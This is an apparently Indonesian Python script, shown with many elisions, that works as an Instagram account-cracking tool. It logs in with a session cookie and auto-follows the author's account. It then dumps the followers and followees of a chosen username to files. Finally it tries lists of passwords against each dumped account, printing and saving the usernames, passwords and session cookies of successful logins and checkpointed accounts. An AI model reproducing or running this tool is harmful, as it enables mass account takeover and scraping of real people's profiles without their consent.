...
{K}[{P}•{K}]{P}——————————————————————————————
{H}[{P}>{H}]{P} Au : ___no__name_07x
{H}[{P}>{H}]{P} Ig : ___no__name_07x
{H}[{P}>{H}]{P} yt : no name 07xxx
{K}[{P}•{K}]{P}——————————————————————————————
""")
# Login Cookie
def ___login___():
    ...
    if ___cookie in ['open', 'Open', 'OPEN']:
        ...
        try:
            ...
            print(f"{H}[{P}*{H}]{H} Welcome :{K} {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{P}[{M}!{P}]{H} Pastikan Cookie Sudah Benar")
        except (ConnectionError):
            exit(f"{P}[{K}!{P}]{H} Koneksi Error")
# Follow Cookie
def ___follow___():
    try:
        ...
        with requests.Session() as ses:
            ...
            if '"status":"ok"' in str(___follow):
                print(f"{H}[{P}!{H}]{H} Login Berhasil");___menu___()
            else:
                print(f"{P}[{M}!{P}]{H} Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
...
def ___menu___():
    try:
        ...
        print(f"{B}[{P}*{B}]{H} User :{K} {___roz['username']}")
        print(f"{B}[{P}*{B}]{H} Follower :{K} {___roz['follower_count']}\n")
    except (IOError):
        print(f"{P}[{M}!{P}]{H} Cookie Invalid");sleep(3);___login___()
    except (KeyError):
        print(f"{P}[{M}!{P}]{H} Cookie Invalid");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
    except (IOError):
    ...
    if ___pilih in ['1','01']:
        ...
        try:
            ...
            ___hasil = input(f"{H}[{P}?{B}]{H} Pilih :{H} ")
            if ___hasil in ['1','01']:
                print(f"{H} ");os.system('cat Results/Ok.txt')
            elif ___hasil in ['2','02']:
                print(f"{H} ");os.system('cat Results/Cp.txt')
            elif ___hasil in ['3','03']:
                ___menu___()
            else:
                exit(f"{P}[{M}!{P}]{H} Wrong Input")
        except:pass
    elif ___pilih in ['a','A']:
        print(f"{P}[{K}!{P}]{H} Menghapus Cookie...");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');exit()
    else:
        exit(f"{P}[{K}!{P}]{H} Wrong Input")
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"\n{H}[{P}?{H}]{H} User :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            ...
            print(f"{H}[{P}?{H}]{H} Name :{K} {___roz['full_name']}\n")
        ...
        with requests.Session() as ses:
            ...
            for z in ___zak['users']:
                ...
                print(f"{H}{z['username']}<=>{z['full_name']}")
            print(f"\n{B}[{P}*{B}]{H} Selesai...")
            print(f"{B}[{P}?{B}]{H} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{H}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{H} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{M}!{P}]{H} Koneksi Error")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\n{H}[{P}?{H}]{H} User :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{P}[{M}!{P}]{H} Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{H}[{P}?{H}]{H} Name :{H} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
...
def ___activity___():
    try:
        ___file = input(f"\n{H}[{P}?{H}]{H} Nama File :{K} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{P}[{M}!{P}]{H} Jangan Kosong")
        else:
            print(f"{P} ")
            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        ...
                        print(f"\r{B}[{P}✔{B}]{H} Status :{H} Success     ")
                        print(f"{B}[{P}>{B}]{H} Username :{H} {uid}")
                        print(f"{B}[{P}>{B}]{H} Password :{H} {pw}")
                        print(f"{B}[{P}>{B}]{H} Follower :{H} {follower}")
                        print(f"{B}[{P}>{B}]{H} Following :{H} {following}")
                        print(f"{B}[{P}>{B}]{H} Cookie :{H} {coki}\n")
                        ...
                        print(f"\r{B}[{P}✘{B}]{P} Status :{B} Checkpoint    ")
                        print(f"{B}[{P}>{B}]{P} Username :{B} {uid}")
                        print(f"{B}[{P}>{B}]{P} Password :{B} {pw}")
                        print(f"{B}[{P}>{B}]{P} Follower :{B} {follower}")
                        print(f"{B}[{P}>{B}]{P} Following :{B} {following}\n")
